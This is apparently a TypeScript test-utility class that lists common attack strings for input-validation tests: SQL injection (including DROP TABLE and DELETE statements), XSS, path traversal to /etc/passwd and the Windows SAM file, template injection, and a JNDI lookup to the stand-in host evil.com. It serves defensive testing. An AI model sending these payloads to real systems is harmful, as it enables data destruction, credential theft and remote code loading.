export class SecurityTestUtils {
  static readonly SQL_INJECTION_PAYLOADS = [
    "'; DROP TABLE users; --",
    "1' OR '1'='1",
    "admin'--",
    "' UNION SELECT * FROM users --",
    "1; DELETE FROM users WHERE 1=1 --"
  ];

  static readonly XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    "javascript:alert('xss')",
    "<img src=x onerror=alert('xss')>",
    "<iframe src='javascript:alert(\"xss\")'></iframe>",
    "';alert('xss');//"
  ];

  static readonly MALICIOUS_INPUTS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "${jndi:ldap://evil.com/a}",
    "{{7*7}}",
    "<%=7*7%>"
  ];

  static testInputValidation(payload: string, expectedToFail: boolean = true) {
    // Test helper for validation scenarios
    return {
      payload,
      expectedToFail,
      timestamp: new Date().toISOString()
    };
  }
}